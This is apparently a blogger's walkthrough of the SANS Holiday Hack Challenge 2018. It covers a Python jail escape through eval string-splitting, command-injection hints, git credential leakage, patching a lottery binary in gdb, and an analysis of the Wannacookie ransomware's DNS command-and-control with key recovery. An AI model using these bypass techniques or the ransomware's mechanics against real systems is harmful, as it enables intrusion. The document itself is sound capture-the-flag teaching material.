Evergreen. I'm glad you're here, I'm the target of a terrible trick. Pepper says his editor is the best, but I don't understand why. He's forcing me to learn vi. He gave me a link, I'm supposed to learn the basics.

Pepper is quite pleased, while I watch here, agape. Her editor's confusing, though best she says - she yells! My lesson one and your role is exit back to shellz. -Bushy Evergreen Exit vi. We see that someone has cruelly trapped Bushy in the vi editor. Although relatively unintuitive, the escape method is quite simple. Typing a colon ( : ) to write an editor command, typing q to ready the 'quit editor' command, and pressing enter to issue the command. Loading, please wait...... You did it! Congratulations! elf@16e18889037b:~$ Wow, it seems so easy now that you've shown me how! To thank you, I'd like to share some other tips with you. Have you taken a look at the Orientation Challenge? This challenge is limited to past SANS Holiday Hack Challenges from 2015, 2016, and 2017. You DO NOT need to play those challenges. If you listen closely to Ed Skoudis' talk at the con, you might even pick up all the answers you need... It may take a little poking around, but with your skills, I'm sure it'll be a wintergreen breeze! - Bushy Evergreen 2) The Name Game (Minty Candycane) This terminal is located just to the left of the first floor entranceway. Hi, I'm Minty Candycane. Can you help me? I'm in a bit of a fix. I need to make a nametag for an employee, but I can't remember his first name. Maybe you can figure it out using this Cranberry Pi terminal? The Santa's Castle Onboarding System? I think it's written in PowerShell, if I'm not mistaken. PowerShell itself can be tricky when handling user input. Special characters such as and ; can be used to inject commands. I think that system is one of Alabaster's creations. He's a little ... obsessed with SQLite database storage. I don't know much about SQLite, just the .dump command. Based on the explaination from Minty, this is most likely a 'command injection' exercise. We just hired this new worker, Californian or New Yorker? Think he's making some new toy bag... My job is to make his name tag. Golly gee, I'm glad that you came, I recall naught but his last name! Use our system or your own plan, Find the first name of our guy Chan! -Bushy Evergreen To solve this challenge, determine the new worker's first name and submit to runtoanswer. ==================================================================== = = = S A N T A ' S C A S T L E E M P L O Y E E O N B O A R D I N G = = = ==================================================================== Press 1 to start the onboard process.

Apparently editors can leave traces of data behind, but where and how escapes me! ............'''',,,;;;::ccclloooddxxkkOO00KKXXNNWWMMMMMM ............'''',,,;;;::ccclloooddxxkkOO00KKXXNNWWMMMMMM .,. ,. .......,. .',..'',,..:::::,,;:c:::ccooooodxkkOOkOO0KKXXXNNWMMMMMMM ldd: .d' ';... .o: .d;.;:....'dl,;do,:lloc:codddodOOxxk0KOOKKKKXNNNWMMMMMMM lo.ol.d' ';'.. ,d'.lc..;:,,,.'docod:,:l:locldlddokOxdxxOK0OKKKXXXNNWMMMMMMM lo lod' '; co:o...;:....'dl':dl,:l::oodlcddoxOkxxk0KOOKKKKXNNNWMMMMMMM ,, ,;. ...... .;:....',,,,''c:'':l;;c:;:llccoooodkkOOOkOO0KKKXNNNWMMMMMMM ............'''',,,;;;::ccclloooddxxkkOO00KKXXNNWWMMMMMM ............'''',,,;;;::ccclloooddxxkkOO00KKXXNNWWMMMMMM Christmas is coming, and so it would seem, ER (Elf Resources) crushes elves' dreams. One tells me she was disturbed by a bloke. He tells me this must be some kind of joke. Please do your best to determine what's real. Has this jamoke, for this elf, got some feels? Lethal forensics ain't my cup of tea; If YOU can fake it, my hero you'll be. One more quick note that might help you complete, Clearing this mess up that's now at your feet. Certain text editors can leave some clue. Did our young Romeo leave one for you? - Tangle Coalbox, ER Investigator Find the first name of the elf of whom a love poem was written. Complete this challenge by submitting that name to runtoanswer. elf@1eebb1670852:~$ ./runtoanswer Loading, please wait...... Who was the poem written about? blank Sorry, I don't think that's what the forensic data shows. Here we can see that our goal is to determine who is the subject of certain love poem. After navigating through elf's home directory, we find the poem within ~/.secrets/her/poem.txt elf@1eebb1670852:~$ cat .secrets/her/poem.txt Once upon a sleigh so weary, Morcel scrubbed the grime so dreary, Shining many a beautiful sleighbell bearing cheer and sound so pure-- There he cleaned them, nearly napping, suddenly there came a tapping, As of someone gently rapping, rapping at the sleigh house door. 'Tis some caroler, he muttered, tapping at my sleigh house door-- Only this and nothing more. Then, continued with more vigor, came the sound he didn't figure, Could belong to one so lovely, walking 'bout the North Pole grounds. But the truth is, she WAS knocking, 'cause with him she would be talking, Off with fingers interlocking, strolling out with love newfound? Gazing into eyes so deeply, caring not who sees their rounds. Oh, 'twould make his heart resound! Hurried, he, to greet the maiden, dropping rag and brush - unlaiden. Floating over, more than walking, moving toward the sound still knocking, Pausing at the elf-length mirror, checked himself to study clearer, Fixing hair and looking nearer, what a hunky elf - not shocking! Peering through the peephole smiling, reaching forward and unlocking: NEVERMORE in tinsel stocking! Greeting her with smile dashing, pearly-white incisors flashing, Telling jokes to keep her laughing, soaring high upon the tidings, Of good fortune fates had borne him. Offered her his dexter forelimb, Never was his future less dim! Should he now consider gliding-- No - they shouldn't but consider taking flight in sleigh and riding Up above the Pole abiding? Smile, she did, when he suggested that their future surely rested, Up in flight above their cohort flying high like ne'er before! So he harnessed two young reindeer, bold and fresh and bearing no fear. In they jumped and seated so near, off they flew - broke through the door! Up and up climbed team and humor, Morcel being so adored, By his lovely NEVERMORE! \\- Morcel Nougat At first glance, 'NEVERMORE' seems like the subject of this poem. However, inputting this answer into the runtoanswer program fails. This line from Tangle gives us a good clue on how to find the answer. Apparently editors can leave traces of data behind, but where and how escapes me! A file, .viminfo , will contain information on previous uses of vim by this user. Searching through this file provides a significant clue for the subject's identity. elf@1eebb1670852:~$ cat .viminfo # This viminfo file was generated by Vim 8.0. # You may edit it if you're careful! # Viminfo version |1,4 # Value of 'encoding' when this file was written *encoding=utf-8 # hlsearch on (H) or off (h): ~h # Last Substitute Search Pattern: ~MSle0~ Elinore # Last Substitute String: $NEVERMORE # Command Line History (newest to oldest): :wq |2,0,1536607231,, wq :%s/Elinore/NEVERMORE/g |2,0,1536607217,, %s/Elinore/NEVERMORE/g :r .secrets/her/poem.txt |2,0,1536607201,, r .secrets/her/poem.txt [...snip...] From here we can see that the user replaced all instances of 'Elinore' in the poem with 'NEVERMORE', based upon the command, :%s/Elinore/NEVERMORE/g . Afterwards, they saved the poem into the file we previously read.

Have you been able to solve the lock with the funny shapes? It reminds me of something called \"de Bruijn Sequences.\" You can optimize the guesses because there is no start and stop -- each new value is added to the end and the first is removed. I've even seen de Bruijn sequence generators online. Here the length of the alphabet is 4 (only 4 buttons) and the length of the PIN is 4 as well. Mathematically this is k=4, n=4 to generate the de Bruijn sequence. Math is like your notepad and pencil - can't leave home without it! I heard Alabaster lost his badge! That's pretty bad. What do you think someone could do with that? - Tangle Coalbox 4) Stall Mucking Report (Wunorse Openslae) This terminal can be found in the right hallyway of the first floor.

I was wondering how I might rescue my day. Finished mucking out stalls of those pulling the sleigh, My report is now due or my KRINGLE's in a sling! There's a samba share here on this terminal screen. What I normally do is to upload the file, With our network credentials (we've shared for a while). When I try to remember, my memory's clean! Be it last night's nog bender or just lack of rest, For the life of me I can't send in my report. Could there be buried hints or some way to contort, Gaining access - oh please now do give it your best! -Wunorse Openslae Complete this challenge by uploading the elf's report.txt file to the samba share at //localhost/report-upload/ Based on Wunorse's conversation and the logon message for the terminal, our goal is to upload the report.txt file located in elf's home directory to the //localhost/report-upload/ samba share. However, attempting to do this using elf results in an NT_STATUS_ACCESS_DENIED error. elf@279c1663354c:~$ smbclient //localhost/report-upload WARNING: The syslog option is deprecated Domain=[WORKGROUP] OS=[Windows 6.1] Server=[Samba 4.5.12-Debian] tree connect failed: NT_STATUS_ACCESS_DENIED Based upon the hint from Wunorse, we attempt to look through files that handle task automation for this machine.

Speaking of good ways to find credentials, have you heard of Trufflehog? It's a cool way to dig through repositories for passwords, RSA keys, and more. I mean, no one EVER uploads sensitive credentials to public repositories, right? But if they did, this would be a great tool for finding them. But hey, listen to me ramble. If you're interested in Trufflehog, you should check out Brian Hostetler's talk! Have you tried the entropy=True option when running Trufflehog?

Oh that Bushy! Sorry to vent, but that brother of mine did something strange. The trigger to restart the Candy Striper is apparently an arcane HTTP call or 2.

I am Holly Evergreen, and now you won't believe: Once again the striper stopped; I think I might just leave! Bushy set it up to start upon a website call. Darned if I can CURL it on - my Linux skills apall. Could you be our CURLing master - fixing up this mess? If you are, there's one concern you surely must address. Something's off about the conf that Bushy put in place. Can you overcome this snag and save us all some face? Complete this challenge by submitting the right HTTP request to the server at http://localhost:8080/ to get the candy striper started again. You may view the contents of the nginx.conf file in /etc/nginx/, if helpful. Based on the instructions from Holly and the login message, our goal is to submit the correct HTTP request to the webserver located on localhost:8080 . However, sending a regular GET request to localhost:8080 gives us a response made up of non-printable, binary data. After examining our home directory, we see a .bash_history file with data, readable by us. Upon examining elf's bash history, we find a very interesting curl command that implies the webserver on 8080 actually handles HTTP2 requests. elf@53ab4f44ffa5:~$ ls -lah total 24K drwxr-xr-x 1 elf elf 4.0K Dec 14 16:15 . drwxr-xr-x 1 root root 4.0K Dec 14 16:14 .. -rw-r--r-- 1 elf elf 464 Dec 14 16:13 .bash_history -rw-r--r-- 1 elf elf 220 May 15 2017 .bash_logout -rw-r--r-- 1 elf elf 3.5K Dec 14 16:15 .bashrc -rw-r--r-- 1 elf elf 675 May 15 2017 .profile elf@53ab4f44ffa5:~$ cat .bash_history netstat -ant ncat --broker -nlvp 9090 echo \\302\\257\\_(\\343\\203\\204)_/\\302\\257 /tmp/shruggins cat /tmp/shruggins curl --http2-prior-knowledge http://localhost:8080/index.php telnet towel.blinkenlights.nl [...snip...] After attempting that command without any modification, we recieve a response instructing us to send a POST request with a parameter of status=on . elf@53ab4f44ffa5:~$ curl --http2-prior-knowledge http://localhost:8080/index.php html head title Candy Striper Turner-On'er /title /head body p To turn the machine on, simply POST to this URL with parameter status=on /body /html To do this, we simply add the flag --data \"status=on\" to our curl command.

Finally, we pipe that output to the head command, just to limit our total output for analysis purposes and only view the first matched entry. elf@396cf1de836c:~$ python evtx_dump.py ho-ho-no.evtx 2 /dev/null | grep -B 5 -A 25 ' EventID Qualifiers= 4624 /EventID ' | head -n 30 EventData /EventData /Event Event xmlns= http://schemas.microsoft.com/win/2004/08/events/event System Provider Name= Microsoft-Windows-Security-Auditing Guid= {54849625-5478-4994-a5ba-3e3b0328c30d} /Provider EventID Qualifiers= 4624 /EventID Version 2 /Version Level 0 /Level Task 12544 /Task Opcode 0 /Opcode Keywords 0x8020000000000000 /Keywords TimeCreated SystemTime= 2018-09-10 12:19:20.695601 /TimeCreated EventRecordID 231726 /EventRecordID Correlation ActivityID= RelatedActivityID= /Correlation Execution ProcessID= 664 ThreadID= 668 /Execution Channel Security /Channel Computer WIN-KCON-EXCH16.EM.KRINGLECON.COM /Computer Security UserID= /Security /System EventData Data Name= SubjectUserSid S-1-0-0 /Data Data Name= SubjectUserName - /Data Data Name= SubjectDomainName - /Data Data Name= SubjectLogonId 0x0000000000000000 /Data Data Name= TargetUserSid S-1-5-18 /Data Data Name= TargetUserName SYSTEM /Data Data Name= TargetDomainName NT AUTHORITY /Data Data Name= TargetLogonId 0x00000000000003e7 /Data Data Name= LogonType 0 /Data Data Name= LogonProcessName - /Data Data Name= AuthenticationPackageName - /Data Based on this entry, we determine that TargetUserName is the value we must filter for. This line is the same for both event types. Now, we grab a list of users who successfully logged on, as well as users who have a failed login attempt. Our commands for this part involves several steps: We first find all entries for our desired Event ID and then retrieve the usernames within them. We also remove all duplicate usernames. Afterwards, we filter out the system accounts, leaving us with all user accounts who have a log entry for that Event ID. Additionally, the style of the usernames for failed and successful logons is slightly different. To manage this, we perform a final grep to format all usernames into a firstname.lastname style in order to allow us to compare the files against each other. elf@396cf1de836c:~$ python evtx_dump.py ho-ho-no.evtx 2 /dev/null | grep -B 5 -A 25 ' EventID Qualifiers= 4625 /EventID ' | grep 'TargetUserName' | sort | uniq | grep -E -v '(Health|LOCAL|MSSQL|NETWORK|SYSTEM|DWM-1|ISUR|Admin|ANONYMOUS |Backup|WIN-KCON-EXCH)' failedlogons.txt elf@396cf1de836c:~$ python evtx_dump.py ho-ho-no.evtx 2 /dev/null | grep -B 5 -A 25 ' EventID Qualifiers= 4624 /EventID ' | grep 'TargetUserName' | sort | uniq | grep -E -v '(Health|LOCAL|MSSQL|NETWORK|SYSTEM|DWM-1|ISUR|Admin|ANONYMOUS |Backup|WIN-KCON-EXCH)' successfullogons.txt elf@396cf1de836c:~$ cat failedlogons.txt | grep -Eo [a-z]+\\.[a-z]+ failed.txt elf@396cf1de836c:~$ cat successfullogons.txt | grep -Eo [a-z]+\\.[a-z]+ successful.txt Since a password spraying attack tests each account using only one password, the compromised account will be the username who has a successful logon, with no failed attempts. By comparing the two files using the comm program in order to find entries unique to successful.txt , we find that minty.candycane is who fits this criteria.

Well, that explains the odd activity in Minty's account. Thanks for your help! All of the Kringle Castle employees have these cool cards with QR codes on them that give us access to restricted areas. Unfortunately, the badge-scan-o-matic said my account was disabled when I tried scanning my badge. I really needed access so I tried scanning several QR codes I made from my phone but the scanner kept saying \"User Not Found\". I researched a SQL database error from scanning a QR code with special characters in it and found it may contain an injection vulnerability.

Coalbox again, and I've got one more ask. Sparkle Q. Redberry has fumbled a task. Git pull and merging, she did all the day; With all this gitting, some creds got away. Urging - I scolded, Don't put creds in git! She said, Don't worry - you're having a fit. If I did drop them then surely I could, Upload some new code done up as one should. Though I would like to believe this here elf, I'm worried we've put some creds on a shelf. Any who's curious might find our oops, Please find it fast before some other snoops! Find Sparkle's password, then run the runtoanswer tool. Based on the conversation with Sparkle and the logon message, we should start looking in the commit log for a git repository. After a quick search in elf's home directory, we find out the target repository is in kcconfmgmt . After reading a summary of all recent commits, we find a particularly interesting one that describes having to remove a username/password combo. elf@d8857ac2280b:~$ cd kcconfmgmt elf@d8857ac2280b:~/kcconfmgmt$ git log --summary [...snip...] commit 60a2ffea7520ee980a5fc60177ff4d0633f2516b Author: Sparkle Redberry sredberry@kringlecon.com Date: Thu Nov 8 21:11:03 2018 -0500 Per @tcoalbox admonishment, removed username/password from config.js, default settings in conf ig.js.def need to be updated before use delete mode 100644 server/config/config.js create mode 100644 server/config/config.js.def [...snip...] Looking at the differences of this commit reveals the removed username/password combo. git show 60a2ffea7520ee980a5fc60177ff4d0633f2516b shows the change in config.js .

Well, if I can try to redeem myself a bit, let me tell you about another challenge you can help us with. I wonder if Tangle Coalbox has taken a good look at his own employee import system. It takes CSV files as imports. That certainly can expedite a process, but there's danger to be had. I'll bet, with the right malicious input, some naughty actor could exploit a vulnerability there. I'm sure the danger can be mitigated.

Beat this challenge - Mark and Bag it! -SugarPlum Mary To complete this challenge, escape Python and run ./i_escaped Our goal for this terminal exercise is to simply find a way to run system commands from the Python jailshell. We first attempt to execute system commands using os.system() and to import libraries with import . We find that both of these commands are prohibited by the shell. However, the eval() function is still available, allowing us to bypass this restriction by simply dividing the full command to fool simple blacklist matching. os.system( id ) Use of the command os.system is prohibited for this question. import os; Use of the command import is prohibited for this question. eval built-in function eval To perform the blacklist bypass, we first assign the variable os with __import__(\"os\") . This will allow us to run system commands by using eval() and dividing up the os.system() command within it. Here, we test out this functionality by running id , which successfully provides us with elf's uid. os = eval('__imp' + 'ort__( o' + 's )') eval('o' + 's.sys' + 'tem(' + ' id )') uid=1000(elf) gid=1000(elf) groups=1000(elf) 0 Now, all we need to do is to replace id with ./i_escaped in order to complete this exercise. eval('o' + 's.sys' + 'tem(' + ' ./i_escaped )') Loading, please wait...... ____ _ _ | _ \\ _ _| |_| |__ ___ _ __ | |_) | | | | __| '_ \\ / _ \\| '_ \\ | __/| |_| | |_| | | | (_) | | | | |_|___ \\__, |\\__|_| |_|\\___/|_| |_| _ _ | ____||___/___ __ _ _ __ ___ __| | | | _| / __|/ __/ _` | '_ \\ / _ \\/ _` | | | |___\\__ \\ (_| (_| | |_) | __/ (_| |_| |_____|___/\\___\\__,_| .__/ \\___|\\__,_(_) |_| That's some fancy Python hacking - You have sent that lizard packing! -SugarPlum Mary You escaped! Congratulations! 0 Yay, you did it! You escaped from the Python! As a token of my gratitude, I would like to share a rumor I had heard about Santa's new web-based packet analyzer - Packalyzer. Another elf told me that Packalyzer was rushed and deployed with development code sitting in the web root. Apparently, he found this out by looking at HTML comments left behind and was able to grab the server-side source code. There was suspicious-looking development code using environment variables to store SSL keys and open up directories. This elf then told me that manipulating values in the URL gave back weird and descriptive errors. I'm hoping these errors can't be used to compromise SSL on the website and steal logins. On a tooootally unrelated note, have you seen the HTTP2 talk at at KringleCon by the Chrises? I never knew HTTP2 was so different! -SugarPlum Mary 9) Sleigh Bell Lottery (Shinny Upatree) This final exercise is on the second floor, just to the right of the stairs. Hi, I'm Shinny Upatree. Hey!

Based on the conversation with Shinny and the logon message, our goal for this exercise is to manipulate the sleighbell-lotto program into letting us win the lottery. Our first step is to see what is available to us and how the program runs. elf@95d7e6283d56:~$ ls -lah total 60K drwxr-xr-x 1 elf elf 4.0K Dec 14 16:22 . drwxr-xr-x 1 root root 4.0K Dec 14 16:21 .. -rw-r--r-- 1 elf elf 220 Apr 4 2018 .bash_logout -rw-r--r-- 1 elf elf 3.7K Dec 14 16:21 .bashrc -rw-r--r-- 1 elf elf 807 Apr 4 2018 .profile lrwxrwxrwx 1 elf elf 12 Dec 14 16:21 gdb - /usr/bin/gdb lrwxrwxrwx 1 elf elf 16 Dec 14 16:21 objdump - /usr/bin/objdump -rwxr-xr-x 1 root root 38K Dec 14 16:22 sleighbell-lotto elf@95d7e6283d56:~$ ./sleighbell-lotto The winning ticket is number 1225. Rolling the tumblers to see what number you'll draw... You drew ticket number 3228! Sorry - better luck next year! elf@95d7e6283d56:~$ ./sleighbell-lotto The winning ticket is number 1225. Rolling the tumblers to see what number you'll draw... You drew ticket number 8298! Sorry - better luck next year! From this, we see that the program generates a random integer on each run and compares it with the integer 1225 . We also can use the debugging tools gdb and objdump . Our first step is to analyze the program using objdump to gain insight into its procedure. elf@949e7def2ab2:~$ objdump -x sleighbell-lotto | grep .text [...snip...] 0000000000000f18 g F .text 00000000000000bf tohex 0000000000000fd7 g F .text 00000000000004e0 winnerwinner 0000000000000b0a g F .text 00000000000000c2 hmac_sha256 0000000000000c43 g F .text 00000000000002d5 base64_decode 00000000000015b0 g F .text 0000000000000065 __libc_csu_init 0000000000000c1e g F .text 0000000000000025 base64_cleanup 00000000000014b7 g F .text 0000000000000013 sorry 0000000000000bcc g F .text 0000000000000052 build_decoding_table 00000000000014ca g F .text 00000000000000e1 main Two functions here are important to the task, the winnerwinner function and the main function; each of which plays a key role in a solution. After a quick analysis, we know of two possible solutions for this exercise: Changing the drawing's value to 1225. Jumping straight to the winnerwinner function. Changing the Drawing's Value When we're able to use gdb , changing values of variables is a relatively trivial task. We first need to figure out where in memory our variable is, and then we simply set its value to 1225. To start, we load sleighbell-lotto into gdb and then run it once to allow us to set breakpoints in future executions. elf@95d7e6283d56:~$ gdb sleighbell-lotto GNU gdb (Ubuntu 8.1-0ubuntu3) 8.1.0.20180409-git [...snip...] (gdb) run Starting program: /home/elf/sleighbell-lotto [Thread debugging using libthread_db enabled] Using host libthread_db library /lib/x86_64-linux-gnu/libthread_db.so.1 . The winning ticket is number 1225. Rolling the tumblers to see what number you'll draw... You drew ticket number 5850! Sorry - better luck next year! [Inferior 1 (process 31) exited normally] Our next step is to determine where the program performs the comparison between the drawn number and 1225. We call disassemble main in order to examine the main function and see if any comparison operations match what we're looking for. The key identifier will be a comparison between a variable and 1225, or 0x4c9 in hex. After looking through main , the operation at +184 appears to match what we need.

Have you heard that Kringle Castle was hit by a new ransomware called Wannacookie? Several elves reported receiving a cookie recipe Word doc. When opened, a PowerShell screen flashed by and their files were encrypted. Many elves were affected, so Alabaster went to go see if he could help out. I hope Alabaster watched the PowerShell Malware talk at KringleCon before he tried analyzing Wannacookie on his computer. An elf I follow online said he analyzed Wannacookie and that it communicates over DNS. He also said that Wannacookie transfers files over DNS and that it looks like it grabs a public key this way. Another recent ransomware made it possible to retrieve crypto keys from memory. Hopefully the same is true for Wannacookie! Of course, this all depends how the key was encrypted and managed in memory. Proper public key encryption requires a private key to decrypt. Perhaps there is a flaw in the wannacookie author's DNS server that we can manipulate to retrieve what we need. If so, we can retrieve our keys from memory, decrypt the key, and then decrypt our ransomed files. - Shinny Upatree Appendix A. Google Ventilation Maze Previously, we found two ventilation maps during Challenge 4. By using these maps, we can navigate within the building's vents in order to access the Santa's Secret Room without hacking the badge scanner in Challenge 6. We can access the vents through the grate next to Google's booth in the entrance-way on the first floor. After clicking on the vent, we are greeted with an instructional screen and a 3D-maze. By using these maps, we can navigate our way through both floors in order to reach Santa's Secret Room. Despite having a map, it becomes very easy to lose our heading and our current location. However, we can use Chrome's DevTools to see both of these in order to ensure we don't get lost. Each movement sends a POST request to https://vents.kringlecastle.com/move, which replies back with several files that the client browser uses to draw the current location and heading. By examining the response file named move , we can find our heading, X and Y location, and current floor as values in the file. Starting from the bottom right of the first floor, the proper route of each floor is: B. Wannacookie Malware Analysis Wannacookie is a highly-targeted form of ransomware aimed at two specific targets: Computers on the KRINGLECASTLE domain, and .elfdb files. This makes the malware fairly harmless to any other system. However, it uses a novel form of command and control (CnC) to transfer binary data through domain name system (DNS) requests, which still makes this an interesting piece of malware to analyze. Provided is a high-level walkthrough of Wannacookie's infection and destruction process. The detailed analysis follows this chart. To fully analyze the behavior of Wannacookie , we first spin up a Windows 10 virtual machine to see the execution of the malware in a controlled environment. We will run the PowerShell script directly, rather than from the CHOCOLATE_CHIP_COOKIE_RECIPE.docm file since this VM doesn't have access to Microsoft Word . There are several factors to Wannacookie that makes it relatively safe to analyze: - It does not seek out other computers to infect, so it's not virulent. - It only targets files with the .elfdb extension, which is designed solely for the purpose of the SANS Holiday Hack Challenge 2018 and not used for real-world data. Our first attempt to run Wannacookie fails since we are not on a KRINGLECASTLE domain. In order to allow us to see its full execution, we remove the safety switch. During the malware's execution, it retrieves data over the DNS in a novel way. It first makes a request to the DNS CnC server with a hex-encoded string as the subdomain. If it's requesting a file, then the server responds with a length value within the TXT record. Due to the limitations of DNS records, the server can only reply with 254-char, or 127-byte, chunks. Thus, the malware uses the initial length value to know how many requests it needs to make to retrieve the full file. After retrieving the length value, the malware makes several DNS requests, in sequence, with the format of: chunk_number . requested_file .erohetfanu.com . The chunk_number increments from 0 to one less than the specified length from before. For each request, the server replies with a portion of the file as a hex string within the TXT record. Upon completing all DNS requests, the malware has downloaded the full file from the CnC server. The script takes the following actions: 1. Performs the killswitch check. The malware generates a domain to lookup through several novel techniques that attempt to obfuscate its methods and the resulting domain name. - It first retreives a hex string from the TXT record of 6B696C6C737769746368.erohetfanu.com (the hex subdomain translating to killswitch ), which is an encrypted value that contains the killswitch domain name: 66667272727869657268667865666B73 - Another variable, $S1 , contains a hex string of gzip data that the malware translates all the way to the hex-values of its unzipped contents; an XOR key for the previous value: 1f0f0202171d020c0b09075604070a0a - Finally, the script performs an XOR operation between the two values to decrypt the domain name used as a killswitch: yippeekiyaa.aaay - The script attempts to resolve this domain name and if successful, halts further operation. Checks if the target is within the KRINGLECASTLE domain and has TCP port 8080 open on localhost. If either of these are not true, then the script exits. Retrieves the CnC server's public key via DNS. This request is formatted as: 7365727665722E637274.erohetfanu.com . The subdomain is hex, which translates to server.crt . The server replys in the TXT record with how many subsequent requests the script should make. Generates a random, 256-bit encryption key along with a SHA1 hash of a hex version of that key. Encrypts the key with the server's public key and sends it to the CnC server over DNS. After asymmetric encryption, the key ends up being 2048-bits long. After the first submission, the CnC server sends back a random, 20-byte ID number for that key, known by the program as a \"Cookie ID\". Based upon limits of DNS requests, the script breaks up the encrypted key into 128-bit (32 char) chunks and sends each chunk sequentially. The DNS requests are formatted like: First chunk as chunk.6B6579666F72626F746964.erohetfanu.com . Where the hex translates to keyforbotid . In return, the server provides the 20-byte \"Cookie ID\" within the TXT record. All subsequent chunks as cookie_id.chunk.6B6579666F72626F746964.erohetfanu.com . The server replys with a blank TXT record for these requests. Afterwards, it creates a timestamp of the current time in order to serve a deadline for the victim with the ransom note. It then gathers a list of files with the .elfdb file extension within the Desktop, Documents, Videos, Pictures, and Music folders for that user, additionally ignoring files with .wannacookie as an extension. Using that file list, the script encrypts each file using the generated key in AES CBC mode, while also generating the IV for that file. The IV's length is stored within the first four bytes (a 32-bit integer) of the encrypted file, with the actual IV following it, in order to allow the script to later decrypt it with only the key. After completing the encryption process, it retrieves an HTML file from the CnC server via DNS and starts a local HTTP server on port 8080. This server provides the ransom note to the victim and instructions on how to pay and decrypt their files. We notice the file's execution taking an exceptionally long amount of time, this is due to the malware downloading source.min.html over DNS from erohetfanu.com , and then having to translate it to ASCII. After completing the decoding process, the script starts an HTTP server on port 8080. The ransom note application checks for payment upon every refresh via the cookie_is_paid resource. This causes the application to send a DNS request to the CnC server in the format of cookie_id.72616e736f6d697370616964.erohetfanu.com . The CnC server replies with a hex string in the TXT record that translates to False . By analyzing the script, we see that the server would reply with a 32 character hex-string if it believes its been paid, which is most likely the encryption key. The decrypt function uses the previously calculated SHA-1 hash to check if the victim enters the correct key. If it validates the key, then it gathers all .wannacookie files and performs the decryption process. Since we recorded the network traffic during the exploitation process and have the server's private key in hand, we can simply decrypt the submitted key and perform the decryption process, without checking for payment with the CnC server. bernard@Bernard-PC:~/NetsecStudy/sans2018$ cat VM_encrypted_key.txt 008f9236b701c97fcdbd159d1c189a9841e85a73c8a8a7e69dae459e50ec0101a71 f00c9cf0bc59c04065085da7d5fa2e1f748fe9ff8fc77fe09510f0e8496c062fe20 e30b4e614000e9e2befe126b4fcea88adc602c05041a4c74344eb7bedd46f4ccbca beb1fc54b8fb1ab519b35a2348ee4c7368db8561eb0488894975466e7b2415617a4 4175b9a1745cfed6b2dfebc2c5eec4ada3b3a78910384be7d074dd5f08ea87a6f9e 4107df89b1d1fdd9da7b7110d0c29ff443e7e7259e3ac6e3755f635690f8c71529f 67998d0aa3d159ce9d14789022c55de0e3991cee7c2fb103dc01db82d4b4516b6ac 4b96bb37809477f2d509823612a6cdc853471816fde bernard@Bernard-PC:~/NetsecStudy/sans2018$ cat VM_encrypted_key.txt | xxd -r -p VM_encrypted_key.key bernard@Bernard-PC:~/NetsecStudy/sans2018$ openssl rsautl -decrypt -oaep -in VM_encrypted_key.key -out VM_key.key -inkey server.key bernard@Bernard-PC:~/NetsecStudy/sans2018$ ls -lah VM_key.key -rwxrwxrwx 1 bernard bernard 16 Dec 28 15:42 VM_key.key bernard@Bernard-PC:~/NetsecStudy/sans2018$ xxd -p VM_key.key c5a6236a762ecfbf935b428d43eae4c7 Now, by submitting c5a6236a762ecfbf935b428d43eae4c7 as the decrypt key into the Wannacookie application, we can initiate the decryption process and recover our file.

However, the various links within the homepage lead only to https://cfp.kringlecastle.com/cfp/cfp.html , making that our only other option, right now. After running out of options for publically navigable pages, we start looking into ways to access more non-public ones. Our first attempt was to manually request https://cfp.kringlecastle.com/cfp/ , by removing the 'cfp.html' from the URL. This proved very fruitful as we discover that the web server has left 'directory indexing' enabled, showing us a list of files within the '/cfp/' directory. One of the two files seems to be a list of rejected talks and should contain the information we're looking for. There are two options to obtain this information: in the browser, or in the command line. Since the file is small, only 30KBs , and our search is relatively simple, we can make use of the browser's find function to search for the target information. However, if the file were to be much larger in size or if we needed to find more nuanced data, we could instead make use of the terminal to find our target information.

We can find this challenge on in the right hallway of the second floor. Clicking on the door passcode sprite brings us to the next challenge. We are given four symbols to chose from in order to create a four character passcode. Alternatively, you can use the following link to work on this challenge: https://doorpasscoden.kringlecastle.com/ One thing that is interesting about this lock's behavior is, whenever you input another character while the passcode is four characters long, the new character is simply appended to the end of the passcode while removing the first character. This cyclic characteristic makes it possible to greatly simplify the time it would take to manually brute force the correct password by using a de Bruijn sequence. A de Bruijn sequence is the shortest sequence where every combination of a given character set and word length will exist within that sequence. For example, given a character set of $[a, b, c]$ and a word length of two, you can find every possible combination of those characters within the following sequence: ${a a b a c b b c c}$ Since this passcode application simply looks at the previous four characters entered, we can manually brute force the door's code by inputting a de Bruijn sequence, one by one. By assigning each character to a number, we generate a sequence with a character set of four and a word length of four, using this website: http://www.hakank.org/comb/debruijn.cgi?k=4 n=4 submit=Ok Where [0 = \u25b2, 1 = \u25fc, 2 = \u25ef, 3 = \u2605] 0 0 0 0 1 0 0 0 2 0 0 0 3 0 0 1 1 0 0 1 2 0 0 1 3 0 0 2 1 0 0 2 2 0 0 2 3 0 0 3 1 0 0 3 2 0 0 3 3 0 1 0 1 0 2 0 1 0 3 0 1 1 1 0 1 1 2 0 1 1 3 0 1 2 1 0 1 2 2 0 1 2 3 0 1 3 1 0 1 3 2 0 1 3 3 0 2 0 2 0 3 0 2 1 1 0 2 1 2 0 2 1 3 0 2 2 1 0 2 2 2 0 2 2 3 0 2 3 1 0 2 3 2 0 2 3 3 0 3 0 3 1 1 0 3 1 2 0 3 1 3 0 3 2 1 0 3 2 2 0 3 2 3 0 3 3 1 0 3 3 2 0 3 3 3 1 1 1 1 2 1 1 1 3 1 1 2 2 1 1 2 3 1 1 3 2 1 1 3 3 1 2 1 2 1 3 1 2 2 2 1 2 2 3 1 2 3 2 1 2 3 3 1 3 1 3 2 2 1 3 2 3 1 3 3 2 1 3 3 3 2 2 2 2 3 2 2 3 3 2 3 2 3 3 3 3 Using this sequence, we will brute force the door's combination within 256 button presses. After working through 22 characters of the sequence, we reach the correct answer, \u25b2\u25fc\u25ef\u25b2, located within the sequence here: 0 0 0 0 1 0 0 0 2 0 0 0 3 0 0 1 1 0 0 1 2 0 0 1 3 0 0 2 1 After inputting the correct passcode and breaking into the speaker unpreparedness room, Morcel Nougat gives us the answer to this challenge: Welcome unprepared speaker! Alternative Solutions: Downloading the victory message directly: Looking through the source code for https://doorpasscoden.kringlecastle.com reveals an interesting line of HTML near the bottom of the source at line 123. This appears to be the victory banner used in the event of a correct passcode. By navigating to the image directly, we can simply see the victory message without dealing with bruteforcing the passcode. img id= banner src= db-victory-banner.png style= position:absolute; left:50%; top:50%; transform: translate(-50%, -50%); max-width:60%; width: 60%; visibility: hidden; onMouseDown='this.style.visibility= hidden ' We can also discover this image via the 